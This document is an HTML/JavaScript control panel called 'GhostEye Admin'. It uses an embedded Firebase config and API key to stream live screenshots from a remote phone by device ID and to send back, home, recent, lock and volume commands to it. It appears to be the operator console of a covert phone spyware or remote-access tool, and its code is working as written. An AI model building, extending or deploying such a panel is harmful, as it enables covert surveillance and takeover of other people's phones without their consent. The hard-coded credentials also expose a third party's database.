<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>GhostEye Admin</title>
    
    <script type="module" src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"></script>
    <script type="module" src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        body { background-color: #000; color: white; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
        
        /* ID Input Section */
        #loginSection { margin-top: 50px; }
        input { padding: 10px; border-radius: 5px; border: 1px solid #444; background: #222; color: white; text-align: center; }
        button.connect { padding: 10px 20px; background: #00ff88; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }

        /* Control Panel (Hidden initially) */
        #controlPanel { display: none; margin-top: 20px; }

        /* Phone Screen Area */
        .screen-box {
            width: 300px; height: 600px; border: 5px solid #333; margin: 20px auto;
            display: flex; align-items: center; justify-content: center; background: #111;
            border-radius: 20px; overflow: hidden; position: relative;
        }
        #liveImage { width: 100%; height: 100%; object-fit: contain; display: none; }
        .placeholder-text { color: #555; }

        /* Buttons Grid */
        .btn-grid { display: flex; justify-content: center; gap: 15px; margin-top: 20px; flex-wrap: wrap; }
        .cmd-btn {
            width: 60px; height: 60px; border-radius: 50%; border: 2px solid #444;
            background: #222; color: white; font-size: 20px; cursor: pointer;
        }
        .cmd-btn:active { background: #00ff88; color: black; transform: scale(0.95); }

        /* Start Screen Button */
        .stream-btn {
            background: #007bff; color: white; padding: 12px 25px; border: none;
            border-radius: 8px; font-size: 16px; cursor: pointer; margin-bottom: 10px;
        }
    </style>
</head>
<body>

    <div id="loginSection">
        <h2>GhostEye Login</h2>
        <input type="text" id="devID" placeholder="Enter Device ID (e.g. 123456)">
        <button class="connect" onclick="connectDevice()">Connect</button>
    </div>

    <div id="controlPanel">
        <h3 id="statusMsg" style="color:#00ff88">Connected</h3>
        
        <button class="stream-btn" onclick="startScreenStream()">
            <i class="fa-solid fa-video"></i> Show Live Screen
        </button>

        <div class="screen-box">
            <p class="placeholder-text" id="waitMsg">Screen Hidden<br>Click 'Show Live Screen'</p>
            <img id="liveImage" src="" alt="Live Feed">
        </div>

        <div class="btn-grid">
            <button class="cmd-btn" onclick="sendCommand('back')"><i class="fa-solid fa-arrow-left"></i></button>
            <button class="cmd-btn" onclick="sendCommand('home')"><i class="fa-regular fa-circle"></i></button>
            <button class="cmd-btn" onclick="sendCommand('recent')"><i class="fa-solid fa-layer-group"></i></button>
        </div>
        
        <div class="btn-grid">
            <button class="cmd-btn" onclick="sendCommand('lock')"><i class="fa-solid fa-lock"></i></button>
            <button class="cmd-btn" onclick="sendCommand('volume_up')"><i class="fa-solid fa-plus"></i></button>
            <button class="cmd-btn" onclick="sendCommand('volume_down')"><i class="fa-solid fa-minus"></i></button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDs5ubX4MGyVoCHIJXXgWBpU7wgoS5jcDM",
            authDomain: "childapp-ce1fe.firebaseapp.com",
            databaseURL: "https://childapp-ce1fe-default-rtdb.firebaseio.com",
            projectId: "childapp-ce1fe",
            storageBucket: "childapp-ce1fe.firebasestorage.app",
            messagingSenderId: "108035285372",
            appId: "1:108035285372:web:generated_placeholder"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        let deviceId = "";

        // --- 1. Connection Logic ---
        window.connectDevice = function() {
            const inputId = document.getElementById('devID').value.trim();
            if(!inputId) return alert("Enter ID!");

            deviceId = inputId;
            document.getElementById('loginSection').style.display = 'none';
            document.getElementById('controlPanel').style.display = 'block';
            document.getElementById('statusMsg').innerText = "Connected to: " + deviceId;
        }

        // --- 2. Button Command Logic (Accessibility) ---
        window.sendCommand = function(action) {
            if(!deviceId) return;
            console.log("Sending: " + action);
            
            // यह ठीक वही तरीका है जो पहले काम करता था
            set(ref(db, 'live_screens/' + deviceId + '/command'), {
                action: action,
                timestamp: Date.now()
            });
        }

        // --- 3. Screen Showing Logic (On Click Only) ---
        window.startScreenStream = function() {
            if(!deviceId) return;

            document.getElementById('waitMsg').innerText = "Waiting for Data...";
            
            // फ़ोन को सिग्नल भेजो कि अब स्क्रीन भेजना शुरू करे (Optional, agar phone me ye logic ho)
            // sendCommand('start_projection'); 

            // Firebase Listener चालू करो
            const imgRef = ref(db, 'live_screens/' + deviceId + '/image');
            
            onValue(imgRef, (snapshot) => {
                const base64 = snapshot.val();
                if(base64) {
                    document.getElementById('waitMsg').style.display = 'none';
                    const imgTag = document.getElementById('liveImage');
                    imgTag.style.display = 'block';
                    imgTag.src = "data:image/jpeg;base64," + base64;
                }
            });
        }
    </script>
</body>
</html>
